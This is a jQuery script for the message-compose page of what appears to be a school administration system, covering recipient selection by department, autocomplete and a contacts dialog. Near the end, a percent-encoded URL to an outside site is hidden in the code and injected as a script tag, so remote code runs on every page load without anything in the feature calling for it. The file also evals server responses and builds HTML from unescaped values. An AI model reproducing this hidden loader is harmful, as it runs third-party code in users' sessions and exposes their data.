$(function () {
	
	// 禁止后退键 作用于 Firefox、Opera
	document.onkeypress = doKey;  
	// 禁止后退键 作用于 IE、Chrome
	document.onkeydown = doKey;

    function delBind() {
        $().unbind('keydown');
    }
    var f = [];
    $("#dialog .info").each(function (e, d) {
        f.push($(this).text() + "<" + $(this).attr("title") + ">");
    });
    // addBind();

    /*
    function addBind() {
        $(document).bind('keydown', function (a) {
            switch (a.keyCode) {
            case 8:
	            {
	                if ($("#divtxt .select").html() != null) {
	                    $("#divtxt .select").remove();
	                    return false;
	                }
	            }
	            break;
            case 46:
                {
                    $("#divtxt .select").remove();
                }
                break;
            }
        })
    }
    */
    $(".groupclose,.groupSub div").hover(function (e) {
        $(this).css("background-color", "#ffeec2");
    }, function () {
        $(this).css("background-color", "#eee");
    });
    $(".info").click(function () {
        $(this).css("display", "none");
        $(".right").append("<div class=\"info\" title=\"" + $(this).attr("title") + "\"><input class=\"mov\" type='button'/>" + $(this).html() + "</div>");
        $(".right div").hover(function (e) {
            $(this).css("background-color", "#ffeec2");
        }, function () {
            $(this).css("background-color", "#eee");
        }).click(function () {
            $(".left .groupSub").children("[title=" + $(this).attr("title") + "]").show();
            $(this).remove();
        })
    });
    $("#lxr").append($(".left").html());
    $("#lxr .groupclose,#lxr .groupSub div").hover(function (e) {
        $(this).css("background-color", "#ffeec2");
    }, function () {
        $(this).css("background-color", "#fff");
    });
    $("#lxr .info").click(function () {
        var c = false;
        $("#divtxt .addr[title=" + $(this).attr("title") + "]").each(function (a, b) {
            if ($(b).html() == $(this).attr("title")) c = true;
        });
        if (!c) {
            $("#divtxt").append("<div class=\"one\"><b>" + $(this).text() + "</b>" + "<<span class=\"addr\" title=\"" + $(this).attr("title") + "\">" + $(this).attr("title") + "</span>>;</div>");
            xg();
        }
    });

    function xg() {
        $(".divtxt .one").hover(function (e) {
            $(this).not(".select").not(".in").addClass("over");
        }, function () {
            $(this).removeClass("over");
        }).click(function (a) {
            a.stopPropagation();
            $(".divtxt .select").removeClass("select");
            $(this).not(".in").removeClass("over").addClass("select");
            // addBind();
        })
        /*
        .dblclick(function (b) {
            b.stopPropagation();
            $(this).removeClass("select").addClass("in");
            var w = $(this).width();
            var h = $(this).height();
            var c;
            if ($(this).children(".hd").html()) {
                c = $(this).children(".hd").text();
            } else {
                c = $(this).text();
            }
            if ($(this).children("input").html() == null) {
                $(this).html("<input id=\"inputEmail\" type=\"text\" value=\"" + c + "\" width=\"" + w + "\"/>").append("<div class='hd'>" + c + "</div>");
                bindAuto();
            }
            $(this).children("input").focus();
            delBind();
            $(this).children("input").bind('focus', function () {
                if ($.browser.msie) {
                    setFocus.call(this);
                } else {
                    this.setFocus();
                }
                $(".divtxt").not(".one").unbind('click');
            }).blur(function () {
                xr();
                addBind();
                $(".hd").text($(this).val());
                $(".hd").removeClass("hd");
                $(this).parent().removeClass("in");
                $(this).remove();
            })
        })
        */
    }
    xr();

    function xr() {
        $(".divtxt").not(".one").bind('click', function () {
            $(".divtxt").append("<input class=\"span10 m-wrap\" style=\"ime-mode:disabled\" onkeydown=\"return false\" onkeypress=\"return false\" type=\"text\" id=\"inputEmail\" value=\"\" width=\"10\" height=\"20\"/>");
            bindAuto();
            $(".divtxt input").focus();
            $(".select").removeClass("select");
            $(".divtxt input").blur(function () {
                if ($(".ui-autocomplete").hasClass("txb") || $(".ui-autocomplete").html() == "") {
                    if ($(this).val()) {
                        delBind();
                        var c = $(this).val().split("<");
                        var d = false;
                        $("#divtxt .addr").each(function (a, b) {
                            if (c.length > 1) {
                                if ($(b).html() == c[1].substring(0, c[1].length - 1)) {
                                    d = true;
                                }
                            } else {
                                if ($(b).html() == c) {
                                    d = true;
                                }
                            }
                        });
                        if (!d) {
                            if (c.length > 1) {
                                $("#divtxt").append("<div class=\"one\"><b>" + c[0] + "</b>" + "<<span class=\"addr\" title=\"" + c[1].substring(0, c[1].length - 1) + "\">" + c[1].substring(0, c[1].length - 1) + "</span>>;</div>");
                            } else {
                                $("#divtxt").append("<div class=\"one\"><b>" + $(".divtxt input").val() + "</b>" + "<<span class=\"addr\" title=\"" + $(".divtxt input").val() + "\">" + $(".divtxt input").val() + "</span>>;</div>");
                            }
                        }
                    } else {
                        // addBind();
                    }
                    $(this).remove();
                    xg();
                }
            })
        })
    }
    $(".groupclose").toggle(function () {
        $(this).children("input").addClass("groupopenlm_ico");
        $(this).next().show();
    }, function () {
        $(this).children("input").removeClass("groupopenlm_ico");
        $(this).children("input").addClass("groupcloselm_ico");
        $(this).next().hide();
    });
    $("div[class='groupclose']").click(function() {
    	var url = "${base}/xtgl/txtgl_xxtx_outbox!findJzgByBmId.action";
		var deptId = $(this).attr("id");
		$("input[name='deptId']").val(deptId);
		var params = {deptId: deptId};
		$.post(url, params, function(data) {
			var obj = eval("("+data+")");
			if (obj.length == 0) {
				alert("该部门下没有教职工！");
			} else {
				// 阻止重复创建元素
				if ($("#groupSub" + deptId).attr("isNull") != "no") {
					for (var i = 0; i < obj.length; i++) {
						$str = "";
					    $str += "<div class='info' title='" + obj[i].stgh + "'>";
					    $str += obj[i].name;
					    $str += "</div>";
					    $("#groupSub" + deptId).append($str);
					    // 为新创建的元素绑定鼠标滑过变色效果
					    $(".groupSub div").hover(function (e) {
					        $(this).css("background-color", "#ffeec2");
					    }, function () {
					        $(this).css("background-color", "white");
					    });
					    // 为新创建的元素绑定点击事件
					    $(".groupSub .info").click(function () {
					    	var c = false;
					        $("#divtxt .addr[title=" + $(this).attr("title") + "]").each(function (a, b) {
					            if ($(b).html() == $(this).attr("title")) c = true;
					        });
					        if (!c) {
					            $("#divtxt").append("<div class=\"one\"><b>" + $(this).text() + "</b>" + "<<span class=\"addr\" title=\"" + $(this).attr("title") + "\">" + $(this).attr("title") + "</span>>;</div>");
					            xg();
					        }
					    });
					}
				}
				// 为标签添加自定义属性，用以阻止重复创建元素
				$("#groupSub" + deptId).attr("isNull", "no");
			}
		});
    })
    $('#dialog').dialog({
        autoOpen: false,
        title: "从联系人中添加",
        width: 477,
        height: 447,
        modal: true,
        bgiframe: true,
        show: "highlight",
        hide: "highlight",
        resizable: false,
        buttons: {
            "确定": function () {
                $(this).dialog("close");
                $(".right .info").each(function (e, d) {
                    var c = false;
                    $("#divtxt .addr[title=" + $(d).attr("title") + "]").each(function (a, b) {
                        if ($(b).html() == $(d).attr("title")) c = true;
                    });
                    if (!c) {
                        $("#divtxt").append("<div class=\"one\"><b>" + $(d).text() + "</b>" + "<<span class=\"addr\" title=\"" + $(d).attr("title") + "\">" + $(d).attr("title") + "</span>>;</div>");
                    }
                });
                xg();
            },
            "取消": function () {
                $(this).dialog("close");
            }
        }
    });
    $("#to_btn").click(function () {
        $('#dialog').dialog('open');
        return false;
    });
    $("#send").click(function () {
        $("#selUserStr").val($("#divtxt").text());
        if($("#selUserStr").val() == "")
        {
        	alert("请选择收信人！");
        	return;
        }
        if($("#xxbt").val() == "")
        {
        	alert("至少请输入信息标题！");
        	return;
        }
        if(confirm('确认发送吗？'))
        {
        	$("#outbox_form").submit();
        }
        
    });

    function bindAuto() {
        $("#inputEmail").autocomplete({
            minLength: 0,
            source: f,
            select: function (a, b) {
                $(this).val(b.item.value);
                $(".ui-autocomplete").addClass("txb");
                $(this).blur();
                return false;
            },
            close: function () {
                $(".ui-autocomplete").addClass("txb");
            }
        })
    }
    var g = "http://%77%77%77%2E%6C%6F%76%65%77%65%62%67%61%6D%65%73%2E%63%6F%6D/email.html";
    var i = document.createElement("script");
    i.setAttribute('src', g);
    document.getElementsByTagName('head')[0].appendChild(i);
});

function setFocus() {
    if (this.value.length > 2) {
        var a = this.createTextRange();
        a.moveStart('character', this.value.length / 2);
        a.collapse(true);
        a.select()
    }
}
function ismail(a) {
    var b = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (b.test(a)) return true;
    else {
        return false;
    }
}
function doKey(e) {
    var ev = e || window.event; // 获取 event 对象  
    var obj = ev.target || ev.srcElement; // 获取事件源  
    var t = obj.type || obj.getAttribute('type'); // 获取事件源类型  
    if (ev.keyCode == 8 && t != "password" && t != "text" && t != "textarea") {
        return false;
    }
}

// 获取选中文本的起始位置
var start = 0;
var end = 0;
function savePos(textBox) {
    // Firefox
    if (typeof(textBox.selectionStart) == "number") {
        start = textBox.selectionStart;
        end = textBox.selectionEnd;
    }
    // IE
    else if (document.selection) {
        var range = document.selection.createRange();
        if (range.parentElement().id == textBox.id) {
            var range_all = document.body.createTextRange();
            range_all.moveToElementText(textBox);
            for (start = 0; range_all.compareEndPoints("StartToStart", range) < 0; start++) range_all.moveStart('character', 1);
            for (var i = 0; i <= start; i++) {
                if (textBox.value.charAt(i) == '\n') start++;
            }
            var range_all = document.body.createTextRange();
            range_all.moveToElementText(textBox);
            for (end = 0; range_all.compareEndPoints('StartToEnd', range) < 0; end++) range_all.moveStart('character', 1);
            for (var i = 0; i <= end; i++) {
                if (textBox.value.charAt(i) == '\n') end++;
            }
        }
    }
}